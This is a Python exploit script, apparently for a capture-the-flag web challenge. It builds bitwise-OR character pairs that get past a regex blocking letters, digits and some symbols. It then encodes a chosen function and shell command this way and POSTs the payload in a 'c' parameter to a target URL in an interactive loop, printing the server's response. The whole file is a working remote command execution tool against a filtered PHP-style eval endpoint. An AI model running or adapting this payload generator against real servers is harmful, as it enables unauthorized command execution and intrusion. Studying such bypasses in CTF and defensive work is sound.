# -*- coding: utf-8 -*-
import os
import re
import requests
import sys
import urllib

OPAND = 0
OPOR = 1


Files = ['rce_cmd_and.txt', 'rce_cmd_or.txt']

class RceCmdGen(object):
    '''
    '''

    def __init__(self, opcode, pattern):
        self._opcode = opcode
        self.pattern = pattern
    
    @property
    def opcode(self):
        return self._opcode

    @opcode.setter
    def opcode(self, value):
        if opcode>=0 and opcode<=1:
            self._opcode = value
        else:
            raise ValueError('range(2) need')
    
    def _rce_or_gen(self):
        content = ''
        for i in range(256):
            for j in range(256):
                if not (re.match(self.pattern, chr(i), re.I) or re.match(self.pattern, chr(j), re.I)):
                    k = i|j
                    if k>=32 and k<=126:
                        param_1 = '%' + hex(i)[2:].zfill(2)
                        param_2 = '%' + hex(j)[2:].zfill(2)
                        content += '{} {} {}\n'.format(chr(k), param_1, param_2)
        with open('rce_cmd_or.txt', mode='w') as f:
            f.write(content)

    def rce_gen(self):
        if isinstance(self.pattern, str):
            if self._opcode == 1:
                self._rce_or_gen()
            elif self._opcode == 2:
                print('To be continued...\n')
            else:
                raise ValueError('Opcode Error')
        else:
            raise TypeError('"str" type need')

def hello():
    print("="*50)
    print('USER:python exp.py <url>')
    print("eg:  python exp.py http://ctf.show/")
    print("exit: input exit in function or command")
    print("="*50)

def check_argv():
    if():
        return False
    else:
        return True

def action(arg, opcode):
    _param_1 = ''
    _param_2 = ''
    for i in arg:
        with open(Files[opcode], mode='r') as f:
            while True:
                line = f.readline()
                if line == '':
                    break
                if line[0] == i:
                    _param_1 += line[2:5]
                    _param_2 += line[6:9]
                    # print(_param_1)
                    # print(_param_2)
                    break

    _res = '("{}"|"{}")'.format(_param_1, _param_2)
    return _res

def main(url):
    # opcode = int(input('[+] Your Opcode: '))
    opcode = 1
    # preg = input('\n[+] Your Pattern: ')
    preg = '[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-'
    rce_cmd = RceCmdGen(opcode=opcode, pattern=preg)
    rce_cmd.rce_gen()
    while True:
        func = input("\n[+] Your Function: ")
        if func == "exit":
            break
        cmd = input("\n[+] Your Command: ")
        if cmd == "exit":
            break
        payload = action(func, opcode=opcode) + action(cmd, opcode=opcode)
        data ={
            'c': urllib.parse.unquote(payload)
        }
        # response = requests.post(url=url+payload)
        # print(payload)
        response = requests.post(url=url, data=data)
        print("\n[*] result:\n"+response.text)

if __name__ == '__main__':
    hello()
    if len(sys.argv)!=2:
        print('[!] Need Url')
        exit(0)
    else:
        url = sys.argv[1]
        main(url=url)